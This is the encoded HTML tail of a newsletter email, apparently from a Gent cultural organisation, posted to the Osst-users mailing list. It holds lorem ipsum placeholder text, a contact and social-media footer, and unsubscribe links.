=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">&nbsp;</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A<p aria-hidden=
=3D"true">.</p>=0A<p aria-hidden=3D"true">&nbsp;</p>=0A</td>=0A<td class=3D=
"spacer" width=3D"44" style=3D"width: 44px;"></td>=0A</tr>=0A</table>=0A</d=
iv>=0A<div data-title=3D"Introductie artikel" id=3D"c2">=0A<table class=3D"=
wrapper" cellpadding=3D"0" cellspacing=3D"0" border=3D"0" width=3D=0A"572" =
style=3D"width: 572px;">=0A<tr>=0A<td colspan=3D"3" class=3D"spacer" height=
=3D"17"></td>=0A</tr>=0A<tr>=0A<td class=3D"spacer" width=3D"44" style=3D"w=
idth: 44px;"></td>=0A<td style=3D=0A'font-family: "Trebuchet MS", helvetica=
, sans-serif; font-size: 16px; line-height: 22px; color: #2f2722;'=0Aalign=
=3D"center">=0A<p style=3D=0A'margin: 16px 0; font-family: "Trebuchet MS", =
helvetica, sans-serif; font-size: 16px; line-height: 22px; color: #2f2722;'=
>=0A<span>Vivamus hendrerit arcu sed erat molestie vehicula. Sed auctor neq=
ue=0Aeu tellus rhoncus ut eleifend nibh porttitor. Ut in nulla enim. Phasel=
lus=0Amolestie magna non est bibendum non venenatis nisl tempor. Suspendiss=
e=0Adictum feugiat.</span></p>=0A</td>=0A<td class=3D"spacer" width=3D"44" =
style=3D"width: 44px;"></td>=0A</tr>=0A</table>=0A</div>=0A<div data-title=
=3D"Introductie artikel" id=3D"c3">=0A<table class=3D"wrapper" cellpadding=
=3D"0" cellspacing=3D"0" border=3D"0" width=3D=0A"572" style=3D"width: 572p=
x;">=0A<tr>=0A<td colspan=3D"3" class=3D"spacer" height=3D"17"></td>=0A</tr=
>=0A<tr>=0A<td class=3D"spacer" width=3D"44" style=3D"width: 44px;"></td>=
=0A<td style=3D=0A'font-family: "Trebuchet MS", helvetica, sans-serif; font=
-size: 16px; line-height: 22px; color: #2f2722;'=0Aalign=3D"center">=0A<p s=
tyle=3D=0A'margin: 16px 0; font-family: "Trebuchet MS", helvetica, sans-ser=
if; font-size: 16px; line-height: 22px; color: #2f2722;'>=0A<span>Vivamus h=
endrerit arcu sed erat molestie vehicula. Sed auctor neque=0Aeu tellus rhon=
cus ut eleifend nibh porttitor. Ut in nulla enim. Phasellus=0Amolestie magn=
a non est bibendum non venenatis nisl tempor. Suspendisse=0Adictum feugiat.=
</span></p>=0A</td>=0A<td class=3D"spacer" width=3D"44" style=3D"width: 44p=
x;"></td>=0A</tr>=0A</table>=0A</div>=0A</td>=0A</tr>=0A<tr>=0A<td height=
=3D"22"></td>=0A</tr>=0A</table>=0A</td>=0A<td width=3D"7" style=3D"width: =
7px;"></td>=0A</tr>=0A<tr>=0A<td height=3D"44" colspan=3D"3"></td>=0A</tr>=
=0A</table>=0A<!-- End content area --><!-- Footer -->=0A<table cellpadding=
=3D"0" cellspacing=3D"0" border=3D"0" width=3D"100%" bgcolor=3D=0A"#FBFAF9"=
 style=3D"min-width: 100%;">=0A<tr>=0A<td height=3D"22" colspan=3D"3"></td>=
=0A</tr>=0A<tr>=0A<td width=3D"8" style=3D"width: 8px;"></td>=0A<td>=0A<tab=
le class=3D"wrapper" cellpadding=3D"0" cellspacing=3D"0" border=3D"0" align=
=3D=0A"center" width=3D"572" style=3D"width: 572px;">=0A<tr>=0A<td class=3D=
"tel" style=3D=0A'font-family: "Trebuchet MS", helvetica, sans-serif; font-=
size: 12px; line-height: 22px; color: #666666;'=0Aalign=3D"center"><strong =
style=3D=0A'font-family: "Trebuchet MS", helvetica, sans-serif; font-size: =
12px; font-weight: bold; line-height: 22px; color: #666666;'>=0A09 224 10 7=
5<br>=0A<a style=3D=0A'font-family: "Trebuchet MS", helvetica, sans-serif; =
font-size: 12px; text-decoration: underline; line-height: 22px; color: #666=
666;'=0Ahref=3D"mailto:info@debronzenuil.be" data-linkid=3D=0A"b3db4097-754=
f-4109-8860-c6fd7a75cc6b">info@debronzenuil.be</a> | <a style=3D=0A'font-fa=
mily: "Trebuchet MS", helvetica, sans-serif; font-size: 12px; text-decorati=
on: underline; line-height: 22px; color: #666666;'=0Ahref=3D"https://www.de=
bronzenuil.eu/" data-linkid=3D=0A"97c9b7a4-9e21-4579-ad7a-8c317f615cb9">deb=
ronzenuil.eu</a><br>=0AVrijdagmarkt 24-25 | 9000 Gent</strong><br>=0A<table=
 width=3D"150" style=3D"width: 150px;" align=3D"center" border=3D"0"=0Acell=
padding=3D"0" cellspacing=3D"0" class=3D"wrapper">=0A<tbody>=0A<tr>=0A<td h=
eight=3D"10" colspan=3D"3"></td>=0A</tr>=0A<tr>=0A<td width=3D"32" style=3D=
"width: 32px;" height=3D"32" align=3D"center">=0A<div><a target=3D"_blank" =
href=3D"https://www.facebook.com/debronzenuil"=0Adata-linkid=3D"950d4797-ed=
7e-4d66-8267-9859c4bc45d5"><img src=3D=0A"https://willemsfonds.klantsite.ne=
t/l/library/download/urn:uuid:7f4ed259-83d8-4706-a3b3-42aeff654313/facebook=
.png"=0Aalt=3D"Facebook" border=3D"0" width=3D"32" height=3D"32" data-src-w=
idth=3D"64"=0Adata-src-height=3D"64" style=3D=0A"display:block; border:none=
; outline:none; text-decoration:none; height:32px !important; width:32px !i=
mportant;"></a></div>=0A</td>=0A<td align=3D"left" width=3D"20" style=3D=0A=
"width: 20px; font-size:1px; line-height:1px;">&nbsp;</td>=0A<td width=3D"3=
2" style=3D"width: 32px;" height=3D"32" align=3D"center">=0A<div><a target=
=3D"_blank" href=3D"https://twitter.com/Debronzenuil"=0Adata-linkid=3D"d56e=
e8ec-269b-43fb-8999-16cbeab26db9"><img src=3D=0A"https://willemsfonds.klant=
site.net/l/library/download/urn:uuid:ea104fab-56af-4eb3-ba9a-935c8e9c13b4/t=
witter.png"=0Aalt=3D"Twitter" border=3D"0" width=3D"32" height=3D"32" data-=
src-width=3D"64"=0Adata-src-height=3D"64" style=3D=0A"display:block; border=
:none; outline:none; text-decoration:none; height:32px !important; width:32=
px !important;"></a></div>=0A</td>=0A<td align=3D"left" width=3D"20" style=
=3D=0A"width: 20px; font-size:1px; line-height:1px;">&nbsp;</td>=0A<td widt=
h=3D"32" style=3D"width: 32px;" height=3D"32" align=3D"center">=0A<div><a t=
arget=3D"_blank" href=3D"https://www.instagram.com/debronzenuil/"=0Adata-li=
nkid=3D"0c230cbe-4c21-440a-b5ca-4c47f4fb5ef6"><img src=3D=0A"https://willem=
sfonds.klantsite.net/l/library/download/urn:uuid:87f87e8e-7380-4840-8604-e1=
014a317977/instagram.png"=0Aalt=3D"Instagram" border=3D"0" width=3D"32" hei=
ght=3D"32" data-src-width=3D"64"=0Adata-src-height=3D"64" style=3D=0A"displ=
ay:block; border:none; outline:none; text-decoration:none; height:32px !imp=
ortant; width:32px !important;"></a></div>=0A</td>=0A<td align=3D"left" wid=
th=3D"20" style=3D=0A"width: 20px; font-size:1px; line-height:1px;">&nbsp;<=
/td>=0A<td width=3D"32" style=3D"width: 32px;" height=3D"32" align=3D"cente=
r">=0A<div><a target=3D"_blank" href=3D=0A"https://www.linkedin.com/showcas=
e/de-bronzen-uil" data-linkid=3D=0A"30f24834-dee6-4826-847d-c2d04323bb7a"><=
img src=3D=0A"https://houthalenhelchteren.willemsfonds.be/l/library/downloa=
d/urn:uuid:60256dd4-d8f1-4e5b-b5b4-915ab17e8ae4/linkedingrijs.png"=0Aalt=3D=
"Instagram" border=3D"0" width=3D"32" height=3D"32" data-src-width=3D"64"=
=0Adata-src-height=3D"64" style=3D=0A"display:block; border:none; outline:n=
one; text-decoration:none; height:32px !important; width:32px !important;">=
</a></div>=0A</td>=0A</tr>=0A</tbody>=0A</table>=0A<table>=0A<tr>=0A<td></t=
d>=0A</tr>=0A</table>=0A</td>=0A</tr>=0A</table>=0A</td>=0A<td width=3D"8" =
style=3D"width: 8px;"></td>=0A</tr>=0A<tr>=0A<td height=3D"22" colspan=3D"3=
"></td>=0A</tr>=0A</table>=0A<table cellpadding=3D"0" cellspacing=3D"0" bor=
der=3D"0" width=3D"100%" bgcolor=3D=0A"#FBFAF9" style=3D"min-width: 100%;">=
=0A<tr>=0A<td height=3D"11" colspan=3D"3"></td>=0A</tr>=0A<tr>=0A<td width=
=3D"8" style=3D"width: 8px;"></td>=0A<td>=0A<table class=3D"wrapper" cellpa=
dding=3D"0" cellspacing=3D"0" border=3D"0" align=3D=0A"center" width=3D"572=
" style=3D"width: 572px;">=0A<tr>=0A<td style=3D=0A'font-family: "Trebuchet=
 MS", helvetica, sans-serif; font-size: 12px; line-height: 22px; color: #66=
6666;'=0Aalign=3D"center"><a style=3D=0A'font-family: "Trebuchet MS", helve=
tica, sans-serif; font-size: 12px; text-decoration: underline; line-height:=
 22px; color: #666666;'=0Ahref=3D=0A"http://houthalenhelchteren.willemsfond=
s.be/l/mailing2/browserpreview/Af1nPlJKY9SwiJgZe47RqVzvWIhNwP8bumxPKkAiKlDN=
c2WnqR~tQc8LOuxCEev2HPQoHpXLF1zrWgupSoByIkCOR1d67awxsCh~UNQ2S1rWPSTQdrW45x~=
sAy0QNfv7G2x16us~ztENqwbyY0eCsSLyso41HP_EEIlDQ6JKV12U"=0Adata-linkid=3D"97f=
b7659-be2a-49c8-ba85-9d688037e32a">Online bekijken</a> -=0A<a style=3D=0A'f=
ont-family: "Trebuchet MS", helvetica, sans-serif; font-size: 12px; text-de=
coration: underline; line-height: 22px; color: #666666;'=0Ahref=3D=0A"http:=
//houthalenhelchteren.willemsfonds.be/k/mailing2/unsubscribe/urn%3Auuid%3A3=
18f3b19-0b54-4eeb-b8b5-aa34a9d73b7b/preview/Ab8XZoP72ypvGsPe40sYwtBwUXggpJ3=
F3u9r7nErmG1j4ucLdNE5sLqU12GPrqDXrA--"=0Adata-linkid=3D"dac5840d-8a16-4668-=
be30-5b66b9a348a9">Voorkeuren beheren</a> -=0A<a style=3D=0A'font-family: "=
Trebuchet MS", helvetica, sans-serif; font-size: 12px; text-decoration: und=
erline; line-height: 22px; color: #666666;'=0Ahref=3D"" data-linkid=3D=0A"2=
1726bdc-1747-43bf-b64e-3f6a4df47230">Privacybeleid</a></td>=0A</tr>=0A</tab=
le>=0A</td>=0A<td width=3D"8" style=3D"width: 8px;"></td>=0A</tr>=0A<tr>=0A=
<td height=3D"11" colspan=3D"3"></td>=0A</tr>=0A</table>=0A<!-- End footer =
--></td>=0A</tr>=0A</table>=0A</body>=0A</html>

-------7f3ea6461dab4d49c94e5accbc7ea5723db75f4a--



--===============2276885679285089073==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============2276885679285089073==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Osst-users mailing list
Osst-users@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/osst-users

--===============2276885679285089073==--


